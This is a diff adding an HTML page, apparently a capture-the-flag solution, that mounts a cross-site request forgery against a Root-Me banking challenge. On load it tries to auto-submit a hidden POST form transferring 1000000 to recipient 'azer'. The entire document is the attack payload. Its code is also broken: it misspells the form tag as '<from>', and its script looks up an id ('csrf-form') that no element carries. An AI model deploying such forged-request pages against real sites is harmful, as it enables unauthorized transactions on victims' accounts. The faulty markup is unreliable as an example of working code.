@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>csrf-attack</title>
+</head>
+<body>
+   <from action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
+    <input type="hidden" name="recipient" value="azer">
+    <input type="hidden" name="amount" value="1000000">
+   </from>
+   <script>
+        document.getElementById('csrf-form').submit();
+   </script>
+</body>
+</html>
